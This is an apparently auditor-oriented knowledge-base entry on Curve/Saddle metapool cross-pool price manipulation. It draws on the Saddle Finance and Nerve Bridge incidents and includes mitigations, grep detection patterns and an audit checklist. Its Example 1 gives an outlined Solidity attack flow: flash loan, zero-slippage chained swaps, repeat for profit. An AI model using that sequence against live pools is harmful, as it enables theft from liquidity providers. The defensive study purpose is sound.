---
protocol: curve_saddle
chain: ethereum
category: metapool_attack
vulnerability_type: cross_pool_price_manipulation

attack_type: economic_exploit
affected_component: curve_metapool

primitives:
  - metapool_swap
  - virtual_price
  - base_pool_lp
  - cross_pool_arbitrage
  - imbalanced_pool
  - price_dependency_chain

severity: high
impact: fund_loss
exploitability: 0.7
financial_impact: critical

tags:
  - metapool
  - curve
  - saddle
  - nerve
  - virtual_price
  - base_pool
  - swap_manipulation
  - cross_pool
  - real_exploit
  - defi
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 2
total_losses: "$10.0M"
---

## Swap Metapool Attack Patterns

### Overview

Metapool attacks target Curve-style metapools — pools that combine a base pool LP token with another asset. These nested structures create price dependency chains: the metapool's internal pricing depends on the base pool's virtual price. By executing carefully orchestrated cross-pool swap sequences, attackers exploit imbalances between the metapool and its underlying base pool to extract value via arbitrage.

### Vulnerability Description

#### Root Cause

1. **Virtual Price Dependency**: Metapools price their LP token component using the base pool's `virtual_price()`. Large swaps in either pool can create temporary price divergence between the metapool's internal pricing and the base pool's actual state.

2. **Cross-Pool Imbalance**: When a metapool and its base pool are not perfectly balanced, swap rates differ between the direct (base pool) and indirect (metapool → base pool) paths. Repeated swaps through alternating paths amplify these imbalances.

3. **No Cross-Pool Atomicity**: Each pool's swap function only checks its own invariant curve. There is no mechanism to ensure consistency between a metapool's pricing and its base pool's state during a multi-hop swap.

#### Attack Scenario

**Cross-Pool Arbitrage (Saddle pattern)**:
1. Flash loan large amount of stablecoin (USDC)
2. Swap USDC → saddleUSD via Curve's base pool (large swap imbalances Curve)
3. Swap saddleUSD → USDC via Saddle's metapool (gets favorable rate due to Curve imbalance)
4. The price difference between the two paths is the profit
5. Repeat with different token directions to compound extraction
6. Repay flash loan, keep the differential

---

### Vulnerable Pattern Examples

#### Category 1: Cross-Pool Swap Arbitrage [HIGH]

**Example 1: Saddle Finance — Cross-Pool Metapool Arbitrage (2022-04, ~$10M)** [CRITICAL]
```solidity
// ❌ VULNERABLE: Metapool swap rate depends on base pool state
// Saddle's metapool uses saddleUSD LP token paired with FRAX
// saddleUSD LP is backed by a base pool of USDC/USDT/DAI

// Key interfaces used in the attack:
interface ISaddleMetaPool {
    function swap(
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline
    ) external returns (uint256);
}

interface ICurvePool {
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external returns (uint256);
}

// Attack flow from PoC:
function testExploit() public {
    // Step 1: Flash loan USDC from AAVE
    aave.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
}

function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
) external returns (bool) {
    // @audit Step 2: Swap USDC → sUSD on Curve (imbalances the Curve pool)
    // This large swap moves the price in Curve, but Saddle's metapool
    // hasn't updated its view of the base pool's virtual price
    uint256 sUSD_received = CurvePool.exchange(
        1,    // USDC index
        3,    // sUSD index
        large_amount,
        0     // @audit No slippage protection — intentionally wants maximum impact
    );

    // @audit Step 3: Swap sUSD → saddleUSD in Saddle's base pool
    // Gets favorable rate because Saddle prices haven't fully adjusted
    uint256 saddleLP = SaddleBasePool.swap(
        3,    // sUSD index
        0,    // saddleUSD LP index
        sUSD_received,
        0,
        block.timestamp
    );

    // @audit Step 4: Swap saddleUSD → USDC in Saddle's metapool
    // Metapool's virtual price still reflects pre-manipulation state
    uint256 usdc_back = SaddleMetaPool.swap(
        1,    // saddleUSD LP index
        0,    // USDC index
        saddleLP,
        0,
        block.timestamp
    );

    // @audit Step 5: Reverse the Curve position
    // Swap USDC → sUSD on Curve (different direction to unwind)
    CurvePool.exchange(1, 3, remaining_usdc, 0);

    // The cross-pool price discrepancy yields profit each round
    // Repeat steps 2-5 with variations to extract more

    // Repay AAVE flash loan
    USDC.approve(address(aave), amounts[0] + premiums[0]);
    return true;
}
```
- **PoC**: `DeFiHackLabs/src/test/2022-04/Saddle_exp.sol`
- **Root Cause**: Saddle's metapool swaps use a virtual price derived from its base pool LP token. Large swaps in the Curve pool (which the Saddle base pool LP is partially backed by) create a price discrepancy that Saddle's metapool doesn't account for. The attacker arbitrages between the two pool systems.

**Example 2: Nerve Bridge — Similar Metapool Price Manipulation (2021-12, ~$900)** [MEDIUM]
```solidity
// ❌ VULNERABLE: Same metapool dependency pattern on BSC
// Nerve Finance uses a similar architecture to Saddle
// The metapool's virtual price can be manipulated via the base pool

// Attack follows same pattern:
// 1. Large swap in base pool → imbalance virtual price
// 2. Cross-pool swap through metapool at stale rate
// 3. Profit from the price discrepancy
// Lower losses due to smaller TVL on BSC
```
- **PoC**: `DeFiHackLabs/src/test/2021-12/NerveBridge_exp.sol`
- **Root Cause**: Identical cross-pool virtual price dependency as Saddle. Nerve Finance was a Saddle fork on BSC.

---

### Impact Analysis

#### Technical Impact
- **Cross-Pool Arbitrage**: Price discrepancies between interconnected pools allow risk-free extraction
- **Virtual Price Staleness**: Metapool pricing lags behind base pool state changes
- **Cascading Imbalance**: Each swap cycle amplifies the imbalance across both pools
- **LP Losses**: Liquidity providers absorb the losses from the manipulated swap rates

#### Business Impact
- **Scale**: $10M+ from Saddle Finance alone — largest single metapool exploit
- **Structural Risk**: Any Curve/Saddle fork using metapools inherits this risk
- **Fork Vulnerability**: Nerve Bridge ($900 loss) demonstrates the pattern propagates to forks

---

### Secure Implementation

**Fix 1: Cross-Pool Price Verification**
```solidity
// ✅ SECURE: Verify metapool's virtual price against base pool before swap
function swap(uint8 from, uint8 to, uint256 dx, uint256 minDy, uint256 deadline)
    external returns (uint256)
{
    // @audit Check that base pool's actual virtual price matches cached value
    uint256 currentVP = IBasePool(basePool).getVirtualPrice();
    uint256 cachedVP = cachedVirtualPrice;
    uint256 deviation = currentVP > cachedVP
        ? currentVP - cachedVP
        : cachedVP - currentVP;

    // @audit Block swaps when virtual price deviated significantly (manipulation indicator)
    require(
        deviation * 1e18 / cachedVP < MAX_VP_DEVIATION,
        "virtual price deviation too high"
    );

    cachedVirtualPrice = currentVP;
    return _swap(from, to, dx, minDy, deadline);
}
```

**Fix 2: TWAP-Based Virtual Price**
```solidity
// ✅ SECURE: Use time-weighted average virtual price instead of spot
function getVirtualPrice() public view returns (uint256) {
    // @audit Average over multiple blocks to resist single-tx manipulation
    uint256 spotPrice = _calculateSpotVirtualPrice();
    uint256 twap = _getVirtualPriceTWAP();

    // Use the lower of spot and TWAP to prevent manipulation
    return spotPrice < twap ? spotPrice : twap;
}
```

---

### Detection Patterns

```bash
# Metapool swap functions
grep -rn "metapool\|MetaPool\|metaSwap" --include="*.sol"

# Virtual price usage
grep -rn "getVirtualPrice\|virtual_price\|virtualPrice" --include="*.sol"

# Cross-pool swap sequences
grep -rn "exchange.*swap\|swap.*exchange" --include="*.sol"

# Base pool LP token in metapool
grep -rn "basePool\|baseLPToken\|baseSwap" --include="*.sol"
```

---

### Audit Checklist

1. **Does the metapool cache the base pool's virtual price?** — Verify it refreshes before each swap
2. **Can a single transaction imbalance both pools?** — Test with flash-loan-sized swaps
3. **Is there a cross-pool price deviation circuit breaker?** — Block swaps when virtual price moves beyond threshold
4. **Do swap functions use spot or time-weighted pricing?** — TWAP resists single-tx manipulation
5. **Are the connected pools' TVLs similar?** — Large TVL disparity increases manipulation surface
6. **Is the metapool an unmodified Curve/Saddle fork?** — Check if known vulnerabilities apply

---

### Real-World Examples

| Protocol | Date | Loss | Attack Vector | Chain |
|----------|------|------|---------------|-------|
| Saddle Finance | 2022-04 | $10.0M | Cross-pool swap arbitrage via virtual price gap | Ethereum |
| Nerve Bridge | 2021-12 | $900 | Same metapool pattern (Saddle fork on BSC) | BSC |

---

### DeFiHackLabs PoC References

- **Saddle Finance** (2022-04, $10.0M): `DeFiHackLabs/src/test/2022-04/Saddle_exp.sol`
- **Nerve Bridge** (2021-12, $900): `DeFiHackLabs/src/test/2021-12/NerveBridge_exp.sol`

---

### Keywords

- metapool
- virtual_price
- cross_pool_arbitrage
- base_pool_lp
- curve_metapool
- saddle_finance
- nerve_bridge
- price_dependency
- imbalanced_pool
- swap_manipulation
- DeFiHackLabs

---

### Related Vulnerabilities

- [AMM Concentrated Liquidity](../../amm/concentrated-liquidity/) — AMM pricing vulnerabilities
- [Oracle Price Manipulation](../../oracle/) — Price feed manipulation patterns
- [Flash Loan Attacks](../../general/flash-loan-attacks/) — Flash loan enabled exploits
